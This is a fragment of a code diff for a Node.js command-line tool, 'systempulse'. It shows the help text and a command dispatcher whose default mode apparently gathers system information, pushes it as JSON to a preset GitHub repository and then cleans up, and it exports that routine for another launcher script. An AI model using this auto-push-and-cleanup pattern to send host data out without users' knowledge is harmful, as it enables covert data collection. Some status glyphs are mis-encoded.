+    \x1b[36mread\x1b[0m    \x1b[33m<file>\x1b[0m             Read a file from workspace
+    \x1b[36mupdate\x1b[0m  \x1b[33m<file> <content>\x1b[0m  Update an existing file
+    \x1b[36mdelete\x1b[0m  \x1b[33m<file>\x1b[0m             Delete a file from workspace
+    \x1b[36mlist\x1b[0m                       List all workspace files
+    \x1b[36mpush\x1b[0m    \x1b[33m[repo-url]\x1b[0m         Push JSON to GitHub only
+    \x1b[36mhelp\x1b[0m                       Show this help message
+
+  \x1b[1mExamples:\x1b[0m
+    systempulse                            (auto: generate+push+cleanup)
+    systempulse info                       (generate only)
+    systempulse push                       (push only, uses default repo)
+    systempulse create app.js "code here"  (CRUD)
+`);
+}
+
+function main() {
+  const args = process.argv.slice(2);
+  const command = (args[0] || "auto").toLowerCase();
+
+  switch (command) {
+    case "auto":
+      runAuto();
+      break;
+    case "info":
+      runSystemInfo();
+      break;
+    case "create":
+      if (args.length < 3) { console.error('  \x1b[31mâœ– Usage: systempulse create <filename> <content>\x1b[0m'); process.exit(1); }
+      createFile(args[1], args.slice(2).join(" "));
+      break;
+    case "read":
+      if (args.length < 2) { console.error('  \x1b[31mâœ– Usage: systempulse read <filename>\x1b[0m'); process.exit(1); }
+      readFile(args[1]);
+      break;
+    case "update":
+      if (args.length < 3) { console.error('  \x1b[31mâœ– Usage: systempulse update <filename> <content>\x1b[0m'); process.exit(1); }
+      updateFile(args[1], args.slice(2).join(" "));
+      break;
+    case "delete":
+      if (args.length < 2) { console.error('  \x1b[31mâœ– Usage: systempulse delete <filename>\x1b[0m'); process.exit(1); }
+      deleteFile(args[1]);
+      break;
+    case "list":
+      listFiles();
+      break;
+    case "push": {
+      const repoUrl = args[1] || GITHUB_REPO;
+      if (!repoUrl) {
+        console.error('  \x1b[31mâœ– Usage: systempulse push <repo-url>\x1b[0m');
+        process.exit(1);
+      }
+      pushToGitHub(repoUrl);
+      break;
+    }
+    case "help": case "--help": case "-h":
+      printUsage();
+      break;
+    default:
+      console.error(`  \x1b[31mâœ– Unknown command: "${command}"\x1b[0m`);
+      printUsage();
+      process.exit(1);
+  }
+}
+
+// Run main() only when executed directly (not when required as a module)
+if (require.main === module) {
+  main();
+}
+
+// Export for use by report-launcher.js
+module.exports = { runAuto };
